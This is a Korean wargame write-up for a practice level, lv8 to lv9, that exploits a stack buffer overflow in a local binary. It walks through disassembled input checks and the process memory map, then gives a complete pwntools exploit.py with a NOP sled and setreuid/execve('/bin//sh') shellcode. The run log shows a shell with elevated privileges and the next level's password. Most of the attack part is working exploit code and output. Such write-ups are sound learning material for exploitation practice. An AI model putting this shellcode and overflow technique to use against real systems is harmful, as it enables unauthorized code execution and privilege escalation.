# Lv8 -> Lv9
## lv9

이번 코드는 양이 꽤 많이 줄었다.




* main + 35
```asm
   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048456 <+38>:	add    eax,0x4
   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]
   0x0804845b <+43>:	add    edx,0x2f
   0x0804845e <+46>:	cmp    BYTE PTR [edx],0xff
   0x08048461 <+49>:	je     0x8048480 <main+80>
   0x08048463 <+51>:	push   0x804852c
   0x08048468 <+56>:	call   0x8048350 <printf@plt>
   0x0804846d <+61>:	add    esp,0x4
   0x08048470 <+64>:	push   0x0
   0x08048472 <+66>:	call   0x8048360 <exit@plt>
   0x08048477 <+71>:	add    esp,0x4
```
* main + 80
```asm
   0x08048480 <+80>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048483 <+83>:	add    eax,0x4
   0x08048486 <+86>:	mov    edx,DWORD PTR [eax]
   0x08048488 <+88>:	add    edx,0x2e
   0x0804848b <+91>:	cmp    BYTE PTR [edx],0xff
   0x0804848e <+94>:	jne    0x80484a7 <main+119>
   0x08048490 <+96>:	push   0x8048549
   0x08048495 <+101>:	call   0x8048350 <printf@plt>
   0x0804849a <+106>:	add    esp,0x4
   0x0804849d <+109>:	push   0x0
   0x0804849f <+111>:	call   0x8048360 <exit@plt>
```

위의 두 루틴에서는 각각 argv[1][47] 이 0xff가 되도록, argv[1][46]이 0xff가 안되도록 제한한다.
즉 덮어 쓸 ret의 값은 우리가 항상 사용하던 0xffff~이 되면 안된다. 
일단 `lv9`의 메모리부터 확인해보자.

```
pwndbg> shell ps
   PID TTY          TIME CMD
 43548 pts/2    00:00:00 bash
 43576 pts/2    00:00:01 gdb
 43582 pts/2    00:00:00 lv9
 43586 pts/2    00:00:00 ps
pwndbg> shell cat /proc/43582/maps
08048000-08049000 r-xp 00000000 08:01 1203612                            /home/lv8/lv9
08049000-0804a000 rwxp 00000000 08:01 1203612                            /home/lv8/lv9
f7ddc000-f7fb1000 r-xp 00000000 08:01 789558                             /lib/i386-linux-gnu/libc-2.27.so
f7fb1000-f7fb2000 ---p 001d5000 08:01 789558                             /lib/i386-linux-gnu/libc-2.27.so
f7fb2000-f7fb4000 r-xp 001d5000 08:01 789558                             /lib/i386-linux-gnu/libc-2.27.so
f7fb4000-f7fb5000 rwxp 001d7000 08:01 789558                             /lib/i386-linux-gnu/libc-2.27.so
f7fb5000-f7fb8000 rwxp 00000000 00:00 0 
f7fcf000-f7fd1000 rwxp 00000000 00:00 0 
f7fd1000-f7fd4000 r--p 00000000 00:00 0                                  [vvar]
f7fd4000-f7fd6000 r-xp 00000000 00:00 0                                  [vdso]
f7fd6000-f7ffc000 r-xp 00000000 08:01 789554                             /lib/i386-linux-gnu/ld-2.27.so
f7ffc000-f7ffd000 r-xp 00025000 08:01 789554                             /lib/i386-linux-gnu/ld-2.27.so
f7ffd000-f7ffe000 rwxp 00026000 08:01 789554                             /lib/i386-linux-gnu/ld-2.27.so
fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
pwndbg> 
```

이를 보면 스택의 범위는 0xfffdd000 ~ 0xffffe000까지임을 알 수 있다.
우리가 평소 사용하는 스택의 상위부분이 0xffff로 시작하고, 그 아래로 0xfffd까지 내려갈 수 있다.
이제 쉘코드를 0xfffd나 0xfffe 부분에 넣어야하는데, argv[2]에 엄청나게 많은 dummy를 주면 argv때문에 전체적인 스택 프레임이 내려갈 것이다.
이를 이용해 다음과 같이 코드를 작성했다.


## exploit.py

```python
from pwn import *

context.log_level = 'debug'
#0xffffa431
argv1 = "a"*0x2c  +  "\x30\x0e\xfe\xff"
argv2 = "\x90" * 20000 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "a"*100000

p = process(['./lv9', argv1, argv2])
p.recvuntil('\n')
p.sendline('id')
p.recvuntil('\n')
p.sendline('my-pass')
p.interactive()
```
------

```
lv8@ubuntu:~$ python exploit.py 
Starting local process './lv9' argv=['./lv9', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0\x0e\xfe\xff', '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90 ... aaaaaaaaaaaaaaaaaaaaaaaa'] 
[DEBUG] Received 0x31 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  30 0e fe ff  │aaaa│aaaa│aaaa│0···│
    00000030  0a                                                  │·│
    00000031
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x2d bytes:
    'uid=1009(lv9) gid=1008(lv8) groups=1008(lv8)\n'
[DEBUG] Sent 0x8 bytes:
    'my-pass\n'
[*] Switching to interactive mode
[DEBUG] Received 0xd bytes:
    'troll slayer\n'
troll slayer
$ 
```